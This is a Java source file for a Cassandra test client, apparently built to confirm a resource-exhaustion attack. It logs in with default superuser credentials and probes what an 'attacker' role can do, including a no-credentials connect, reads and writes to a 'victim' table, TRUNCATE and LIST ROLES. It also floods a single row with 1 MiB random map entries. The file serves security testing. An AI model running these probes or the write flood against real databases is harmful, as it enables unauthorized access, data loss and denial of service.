// U12 client, 3-b confirm (adapted from the stage-2 U12Load: login credentials added; admin and probe modes added).
// Java driver 3.12.1 (Cassandra's lib), native protocol v4, one connection, one request in flight.
//   java -Du12.user=<role> -Du12.pass=<pw> U12Load write <host> <ck> <kFrom> <kTo>
//        writes k = kFrom..kTo-1:  UPDATE u12.t SET m = m + {k: 1 MiB urandom} WHERE pk=0 AND ck=<ck>
//        -Dstop_on_error=true (default) | false (arm N: count failures, keep going until kTo or 20 consecutive failures)
//   java -Du12.user=cassandra -Du12.pass=cassandra U12Load admin <host> <stmt>...   (superuser setup; retries login for 120 s)
//   java -Du12.user=<role> -Du12.pass=<pw> U12Load probe <host>   (what the attacker role can and cannot do; no data written)
// Prints one line per 10 acks and a final "acked=<n> failed=<m>" line.
import com.datastax.driver.core.*;
import com.datastax.driver.core.policies.*;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.*;

public class U12Load {
    static Cluster cluster(String host, String user, String pass) {
        Cluster.Builder b = Cluster.builder().addContactPoint(host).withProtocolVersion(ProtocolVersion.V4)
            .withLoadBalancingPolicy(new WhiteListPolicy(new RoundRobinPolicy(),
                Collections.singletonList(new InetSocketAddress(host, 9042))))
            .withSocketOptions(new SocketOptions().setReadTimeoutMillis(60000).setConnectTimeoutMillis(10000))
            .withPoolingOptions(new PoolingOptions().setConnectionsPerHost(HostDistance.LOCAL, 1, 1))
            .withRetryPolicy(FallthroughRetryPolicy.INSTANCE)
            .withoutJMXReporting();
        if (user != null) b = b.withCredentials(user, pass);
        return b.build();
    }
    static String U() { return System.getProperty("u12.user"); }
    static String P() { return System.getProperty("u12.pass"); }
    static long now() { return System.currentTimeMillis(); }

    static void tryStmt(Session s, String label, String q) {
        try { s.execute(q); System.out.println(now() + " PROBE " + label + ": ALLOWED"); }
        catch (Exception e) { System.out.println(now() + " PROBE " + label + ": " + e.getClass().getSimpleName() + ": " + e.getMessage()); }
    }

    public static void main(String[] a) throws Exception {
        String host = a[1];
        if (a[0].equals("admin")) {
            long dl = now() + 120000; Cluster c = null; Session s = null;
            while (true) {
                try { c = cluster(host, U(), P()); s = c.connect(); break; }
                catch (Exception e) {
                    try { c.close(); } catch (Exception x) {}
                    if (now() > dl) throw e;
                    System.out.println(now() + " login not ready: " + e.getClass().getSimpleName() + ": " + e.getMessage());
                    Thread.sleep(2000);
                }
            }
            System.out.println(now() + " logged in as " + U());
            for (int i = 2; i < a.length; i++) {
                String q = a[i];
                if (q.toUpperCase().startsWith("LIST ")) {
                    System.out.println(now() + " > " + q);
                    for (Row r : s.execute(q)) System.out.println("    " + r);
                } else { s.execute(q); System.out.println(now() + " ok: " + q); }
            }
            c.close(); return;
        }
        if (a[0].equals("probe")) {
            // pre-auth: no credentials at all
            try (Cluster c0 = cluster(host, null, null)) { c0.connect(); System.out.println(now() + " PROBE no-credentials connect: ALLOWED"); }
            catch (Exception e) { System.out.println(now() + " PROBE no-credentials connect: " + e.getClass().getSimpleName() + ": " + e.getMessage()); }
            try (Cluster c = cluster(host, U(), P()); Session s = c.connect()) {
                System.out.println(now() + " PROBE login as " + U() + ": ok");
                tryStmt(s, "SELECT u12.t", "SELECT pk FROM u12.t LIMIT 1");
                tryStmt(s, "SELECT victim table", "SELECT k FROM vks.kv LIMIT 1");
                tryStmt(s, "CREATE KEYSPACE", "CREATE KEYSPACE probe_ks WITH replication = {'class':'SimpleStrategy','replication_factor':1}");
                tryStmt(s, "CREATE TABLE in u12", "CREATE TABLE u12.probe_t (k int PRIMARY KEY)");
                tryStmt(s, "ALTER TABLE u12.t", "ALTER TABLE u12.t WITH comment = 'probe'");
                tryStmt(s, "TRUNCATE u12.t", "TRUNCATE u12.t");
                tryStmt(s, "INSERT victim table", "INSERT INTO vks.kv (k, v) VALUES (-1, 0x00)");
                tryStmt(s, "LIST ROLES", "LIST ROLES");
            }
            return;
        }
        int ck = Integer.parseInt(a[2]), from = Integer.parseInt(a[3]), to = Integer.parseInt(a[4]);
        boolean stopOnError = Boolean.parseBoolean(System.getProperty("stop_on_error", "true"));
        SecureRandom rnd = new SecureRandom();
        long ok = 0, fail = 0; int consec = 0;
        Cluster c = cluster(host, U(), P()); Session s = c.connect();
        System.out.println(now() + " connected as " + U());
        PreparedStatement ps = s.prepare("UPDATE u12.t SET m = m + ? WHERE pk = ? AND ck = ?");
        ps.setConsistencyLevel(ConsistencyLevel.ONE);
        byte[] v = new byte[1048576];
        for (int k = from; k < to; k++) {
            rnd.nextBytes(v);
            Map<Integer, ByteBuffer> m = new HashMap<>();
            m.put(k, ByteBuffer.wrap(v.clone()));
            try {
                s.execute(ps.bind(m, 0, ck));
                ok++; consec = 0;
                if (ok % 10 == 0) System.out.println(now() + " acked=" + ok + " k=" + k);
            } catch (Exception e) {
                fail++; consec++;
                System.out.println(now() + " FAIL k=" + k + " " + e.getClass().getSimpleName() + ": " + e.getMessage());
                if (stopOnError || consec >= 20) break;
                try { Thread.sleep(1000); } catch (InterruptedException ie) { break; }
            }
        }
        System.out.println(now() + " acked=" + ok + " failed=" + fail);
        try { c.close(); } catch (Exception e) {}
        System.exit(fail == 0 ? 0 : 1);
    }
}
